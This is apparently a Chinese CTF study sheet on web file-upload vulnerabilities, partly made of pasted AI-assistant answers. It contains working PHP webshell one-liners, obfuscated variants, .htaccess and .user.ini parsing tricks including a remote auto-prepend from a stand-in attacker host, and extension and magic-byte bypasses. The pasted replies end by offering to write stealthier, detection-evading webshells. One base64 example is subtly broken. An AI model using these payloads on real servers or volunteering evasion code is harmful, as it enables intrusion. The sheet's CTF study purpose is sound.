### 该文本提供ctf复习题（主要是web）
- 该文本作用
    - 复习参考
    - 指明知识区块
- 注意点
    - 该文本不提供过于基础的问题
----

### 文件上传漏洞知识点

<details>
  <summary>文件上传必须是什么请求方式（三种，一种最常用）？</summary>

  1. **POST**（最常用，通常配合 `multipart/form-data`）
  2. **PUT**（某些 WebDAV 配置或 API 场景）
  3. **PATCH**（用于断点续传等特殊场景）
</details>

<details>
  <summary>文件上传成功的核心点是什么（http请求头的某个条目）？</summary>

  核心点是 **`Content-Type`**。
  在文件上传请求中，该条目必须指定为 `multipart/form-data`，并包含一个 `boundary` 字符串，用于分隔表单中的不同字段和文件数据。
</details>

<details>
  <summary>表单中需要 <input type="file" name="upload"> 是什么意思？</summary>
  
  这个东西会生成一个选择框，用来选择文件（点击选择文件）。
  如果看到了有这个html行，就说明很可能存在文件上传点，此时可以考虑文件上传漏洞。
</details>

<details>
  <summary>一个能够成功上传文件的HTML表单必须满足哪三个元素？</summary>

  方法必须是 POST：method="POST"（正如你笔记中前两条提到的）。
  必须有文件输入框：即 <input type="file" name="...">。
  必须声明编码类型（最重要）：表单标签必须加上 enctype="multipart/form-data"。
</details>

<details>
  <summary>什么是一句话木马？</summary>
  
  形式如<?php eval($_POST['a']) ?>
  其中eval就是执行命令的函数，**$_POST[‘a’]**就是接收的数据。eval函数把接收的数据当作PHP代码来执行。这样我们就能够让插入了一句话木马的网站执行我们传递过去的任意PHP语句。
</details>

> 形式更换
- php,asp,aspx各是什么，它们的一句话木马又是什么？
- 一句话木马整套攻击流程？
- 一句话木马的原理？
<details>
<summary> 服务器不允许上传php文件怎么办？</summary>
参考攻防世界web简单题easyupload一题
<br>
<br>
查看js,看看是不是js限制了文件类型和内容，是的话禁用js即可。
    <details>
    <summary>有时候后端对文本内容进行过滤，绕过方法有？</summary>
    看来你遇到了一个典型的 **WAF（Web 应用防火墙）** 或 **后端安全校验**。从你的描述来看，这道题设置了多重关卡。

当系统提示“文件看起来是邪恶的”时，通常意味着它不仅检查**后缀名**，还在检查**文件内容**（Content Inspection）或 **MIME 类型**。

以下是绕过这类限制的几个常见思路，你可以按顺序尝试：

---

### 1. 内容绕过：避开敏感函数

系统提示“邪恶”，极大概率是因为检测到了 `eval`、`system`、`assert` 等 PHP 关键字。

* **利用字符串拼接：**
```php
<?php $a = "ev"."al"; $a($_POST['x']); ?>

```


* **利用 `$_GET` 传参绕过检测：**
```php
<?php $_GET['a']($_POST['x']); ?>
// 访问时使用：file.php?a=eval，然后 POST 传递 x=phpinfo();

```


* **使用短标签（如果环境支持）：**
```php
<?= `$_GET[x]`; ?>  // 使用反引号执行系统命令

```



### 2. MIME 类型绕过 (Content-Type)

即便你修改了后缀名为 `.img`，抓包工具（如 Burp Suite）显示的 `Content-Type` 可能依然是 `text/plain` 或 `application/octet-stream`。

* **操作：** 在上传时使用 Burp Suite 拦截请求，将 `Content-Type` 手动修改为图片格式：
`Content-Type: image/jpeg` 或 `image/png`。

### 3. 文件头检查 (File Header/Magic Bytes)

有些后端会检查文件的前几个字节来判断文件类型。如果不是合法的图片头，就会报错。

* **绕过方法：** 在木马代码的最前面添加图片的幻数（Magic Bytes）。
* **GIF89a** 是最常用的，因为它简单且是纯文本：


```php
GIF89a
<?php eval($_POST['x']); ?>

```



### 4. 后缀名黑名单/白名单

既然 `txt` 和 `img` 都被拦截，你需要确认后端到底允许什么后缀。

* **尝试黑名单绕过：** 如果后端只禁止了 `.php`，可以尝试 `.php3`, `.php5`, `.phtml`, `.phps`。
* **尝试后缀截断/重叠：** 例如 `shell.php.jpg` 或者 `shell.pphphp`（如果后端执行一次性替换）。
* **配合 .htaccess 或 .user.ini：**
如果能上传 `.htaccess`（Apache）或 `.user.ini`（Nginx/PHP），可以强制让服务器将图片文件当作 PHP 执行。

---

### 建议操作步骤

1. **先测试纯文本：** 上传一个内容只有 `123` 的 `test.jpg`，看是否报错。如果不报错，说明你的代码内容被特征库匹配了。
2. **加入图片头：** 在木马前加上 `GIF89a`。
3. **编码绕过：** 使用 Base64 编码你的代码，然后在 PHP 中解码执行，避开 `eval` 关键字的直接扫描：
```php
<?php $c=base64_decode("ZXZhbCgkX1BPU1RbJ3gnXSk7"); @$c; ?>

```



**你想让我帮你写一个更隐蔽的免杀木马脚本，还是想针对具体的 WAF 过滤逻辑进行分析？**
        <details>
        <summary>对于针对<?php eval($_POST['a']) ?>中php等字样进行过滤的</summary>
        这就是 CTF 中最经典的“关键字黑名单”过滤，通常被戏称为“无字母数字 WebShell”挑战的前奏。既然 `php` 这个词本身被禁了，正常的 `<?php` 标签就会失效。

你可以尝试以下几种进阶的绕过姿势，它们专门对付那种“看到 `php` 就报错”的 WAF：

---

### 1. 使用短标签 (Short Tags)

如果服务器配置（`short_open_tag = On`）允许，你可以完全避开 `php` 这三个字母：

* **标准短标签：**
`<?  eval($_POST['x']); ?>`
* **短标签输出（最常用）：**
`<?= (自定义函数或命令) ?>`
例如执行系统命令：`<?= `ls /`; ?>` 或者 `<?= system('cat /flag'); ?>`

### 2. 这里的 `php` 是指内容还是后缀？

如果后缀也不能带 `php`，而你已经能上传文件了，可以利用配置文件改变解析规则：

* **上传 `.htaccess` (Apache 专用):**
如果目标是 Apache 环境，先上传一个名为 `.htaccess` 的文件，内容如下：
```apache
AddType application/x-httpd-php .jpg

```


这会告诉服务器：**“把所有 .jpg 文件当做 PHP 脚本来执行”**。之后你上传包含木马的 `shell.jpg` 就能成功解析。
* **上传 `.user.ini` (Nginx/PHP-FPM 专用):**
如果目录下有已存在的 PHP 文件（比如 `index.php`），你可以上传 `.user.ini`：
```ini
auto_prepend_file=shell.jpg

```


这会让 `index.php` 在执行前自动包含你的 `shell.jpg` 内容。

### 3. 终极手段：无字母数字绕过 (None-Alphanumeric)

如果它过滤得非常狠（比如连 `eval`, `system` 也禁了），你需要构造一个“看起来全是乱码”的木马。

* **异或 (XOR) 绕过：** 利用两个特殊字符串进行异或运算，生成你需要的字符。
* **取反 (Bitwise Not) 绕过：**
利用 PHP 中字符串取反的特性：`(~%8F%97%8F%96%91%90)();` 这种形式在代码审计中极难被静态规则发现。

---

### 接下来该怎么做？

你需要先确认两件事：

1. **容器环境：** 是 Apache 还是 Nginx？（决定了是用 `.htaccess` 还是 `.user.ini`）
2. **过滤强度：** 仅仅是禁了 `php` 字符串，还是连 `(` `)` `[` `]` 这种符号也禁了？

**如果你想继续挑战，可以告诉我后端报错的具体环境（或者是题目的平台名称），我可以帮你写一段针对性的“免杀”Payload 试试看？**

这是一个非常敏锐的观察！在理想的安全架构中，确实应该将**上传目录**与**执行环境**完全隔离，但在 CTF 题目和许多现实中的中小型网站配置中，这种隔离往往并不严密。

这里有几个核心原因，解释了为什么 `.htaccess` 能够成为文件上传漏洞中的“神兵利器”：

### 1. 局部作用域的“权限下放”

Apache 设计 `.htaccess` 的初衷是为了让用户（特别是那些没有服务器主配置文件 `httpd.conf` 修改权限的虚拟主机用户）能够**按目录**自定义配置。

* **生效机制**：当 Apache 处理一个请求时，它会从当前请求的目录开始，一直向上级目录寻找 `.htaccess` 文件。如果找到了，里面的配置就会**覆盖**全局配置。
* **默认开启**：只要全局配置文件中对该目录设置了 `AllowOverride All`，`.htaccess` 就会生效。很多一键安装包（如旧版 XAMPP/phpStudy）默认就是开启的。

---

### 2. “目录隔离”与“解析逻辑”的矛盾

你提到的“目录分隔”通常有两种理解，但它们在 Apache 默认逻辑下都有漏洞：

* **物理路径隔离**：即便你把文件上传到了 `/var/www/html/uploads/`，只要这个目录在 Apache 的 `DocumentRoot`（网站根目录）之下，且该目录没有被配置为 `php_admin_flag engine off`（禁用 PHP 引擎），它就具备执行脚本的潜力。
* **权限限制失效**：如果上传目录没有禁止 `.htaccess` 的解析，攻击者上传的 `.htaccess` 就会重写该目录的 **MIME 映射表**。

> **举个例子：**
> 正常情况下，服务器看到 `.jpg` 结尾的文件，会直接丢给浏览器渲染。但你在上传目录放了 `.htaccess` 说：“在这个文件夹里，所有 `.jpg` 都要交给 PHP 解释器处理。” 那么服务器就会乖乖听话。

---

### 3. CTF 题目的特意设计

在真实的生产环境中，高水平的运维会采取以下措施：

1. **全局禁用**：在 `httpd.conf` 中设置 `AllowOverride None`，直接无视 `.htaccess`。
2. **写执行分离**：上传目录设置“只写不可执行”权限，或者通过 Web 服务器配置禁止解析该目录下的任何脚本。
3. **异地存储**：将上传的文件存放在对象存储（如阿里云 OSS）或完全独立的静态资源服务器上，那里根本没有 PHP 解释器。

**但在 CTF 中**，为了考察你对 Web 服务器解析特性的理解，题目通常会故意留下 `AllowOverride All` 这个缺口。

---

### 4. 常见的 .htaccess 攻击 Payload

除了你之前看到的改后缀，`.htaccess` 还能玩出很多花样：

* **设置解析特定文件：**
```apache
<FilesMatch "my_secret_file">
  SetHandler application/x-httpd-php
</FilesMatch>

```


（这会让一个叫 `my_secret_file` 的文件即便没有后缀也能被当做 PHP 执行）
* **包含远程文件（需开启 allow_url_include）：**
```apache
php_value auto_prepend_file "http://attacker.com/shell.txt"

```



### 总结

`.htaccess` 就像是目录里的“土皇帝”，只要主配置文件给了它“自治权”，它就能更改该目录下的所有规则。

**你想试试看在你的环境里通过 `.htaccess` 配合一个普通的 `.png` 图片来获取 `phpinfo()` 吗？我们可以写一个最简化的实验流程。**
        </details>
  
</details>

> 形式更换
- 什么是.user.ini (php)，为什么它在文件上传漏洞中扮演着重要角色？
- 为什么.user.ini和.htaccess这种配置文件尽管有专门的存放地点，但还是能在ctf题的上传文件目录中被使用？
- .htaccess和.user.ini的区别（在哪一层，分别影响什么）？
- .htaccess和.user.ini在两类环境中的扫描模式分别是什么样的？
- .htaccess和.user.ini的使用条件是？
- .user.ini不及时生效的原因有？
- 什么叫.user.ini的寄生特性？
- php.ini的几种模式有哪些，对于.user.ini都有什么用，对文件上传漏洞都有什么用？
- 在哪配置php模式，php.ini什么时候发挥作用，在哪发挥作用，怎么控制(从根本的配置到发挥作用的示例过程来讲)？
- .user.ini对于php版本的要求是？
- 什么叫做“魔数”？
- “魔数”能够骗过linux的file命令吗？
- 为什么魔数能够生效，这是不是说明纯文本没有文件头？
- 为什么要用printf来输入魔数，而不能用文本编辑器？
- 如何有效查找自己上传的文件的位置（提示：bp流量）？
- 为什么.user.ini的文件头写上GIF89a后语句仍然能够生效？
<details>
<summary>如何欺骗服务器使其误判上传的文件的类型？</summary>
提示:<br>
修改后缀<br>
修改文件头部信息<br>
谎报文件MIME类型<br>
若限制了文件后缀名（黑名单）: <br>
大小写绕过：尝试 .pHp, .AsP（适用于对大小写不敏感的 Windows 服务器）。<br>
别名绕过：使用服务器支持的其他扩展名。例如 PHP 可能会解析 .php3, .php4, .phtml, .pht。<br>
双后缀名：例如 shell.jpg.php。如果服务器从左向右解析，可能只看到 .jpg。<br>
空字节截断 (Null Byte Injection)：<br>
构造：shell.php%00.jpg<br>
原理：在一些旧版本的编程语言（如 PHP 5.3 之前）中，底层 C 语言处理文件名时遇到 %00（十六进制 0x00）会认为字符串已结束，从而将文件保存为 shell.php，而逻辑校验层看到的则是 .jpg。<br>
Apache 解析漏洞：Apache 默认从右向左识别后缀。如果遇到不认识的后缀（如 .qwer），它会继续向左看。构造 shell.php.qwer 可能被识别为 PHP。<br>
Nginx 解析漏洞：在某些配置下，访问 test.jpg/x.php 会导致 Nginx 将 test.jpg 当作 PHP 脚本执行。<br>
IIS 解析漏洞：例如分号截断 image.asp;.jpg，IIS 6.0 会将其解析为 asp 文件。<br>
图片马 (Image Polyglot)<br>
这是最高级的欺骗方式：将恶意代码真正地嵌入到合法的二进制图片数据中。<br>
操作方法：使用 copy /b image.jpg + shell.php webshell.jpg 命令将脚本合并到图片尾部，或者利用 EXIF 信息（如标题、版权字段）插入代码。<br>
目的：确保文件既能通过后端严格的图形库（如 GD 库）的渲染检查，又能通过后缀修改或解析漏洞在服务器上运行。<br>
